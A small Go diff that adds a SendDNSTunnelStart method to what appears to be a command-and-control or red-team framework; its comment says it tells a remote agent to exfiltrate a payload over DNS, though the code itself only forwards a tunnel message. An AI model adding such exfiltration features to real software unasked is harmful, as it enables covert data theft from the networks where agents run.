@@ -677,3 +677,9 @@ func (s *Session) SendWorkflowStart(sessionID string, req proto.WorkflowStart) e
 	req.SessionID = sessionID
 	return s.sendTunnelMsg(proto.TypeWorkflowStart, req)
 }
+
+// SendDNSTunnelStart asks the agent to exfil a payload over DNS.
+func (s *Session) SendDNSTunnelStart(sessionID string, req proto.DNSTunnelStart) error {
+	req.SessionID = sessionID
+	return s.sendTunnelMsg(proto.TypeDNSTunnelStart, req)
+}
